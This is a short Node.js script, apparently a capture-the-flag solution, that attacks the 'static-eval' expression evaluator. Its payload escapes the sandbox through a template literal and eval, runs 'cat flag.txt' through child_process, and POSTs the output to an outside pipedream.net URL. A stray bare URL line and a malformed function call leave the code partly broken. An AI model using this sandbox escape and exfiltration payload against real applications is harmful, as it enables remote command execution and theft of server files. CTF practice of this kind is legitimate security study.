var evaluate = require('static-eval');
var parse = require('esprima').parse;



const hasPassed = ({ exam, paper, assignment }, formula) => {

    console.log(exam, paper, assignment)
    let ast = parse(formula).body[0].expression;
    let weight = evaluate(ast, { exam, paper, assignment });
    console.log(weight)
    return parseFloat(weight) >= parseFloat(10.5);
}

// instead of console.log, maybe I need to send a message back to some fake address with the flag
var src = "(function(x) {return `${eval(\"fetch('https://eowrn5qa974f5at.m.pipedream.net', {method: 'POST', body: JSON.stringify({message: global.process.mainModule.constructor._load('child_process').execSync('cat flag.txt').toString()})})\")}`;})()";
https://eowrn5qa974f5at.m.pipedream.net
var ast = parse(src).body[0].expression;

let out = hasPassed(("a", "b", "c"), src)
console.log("out is: ", out)



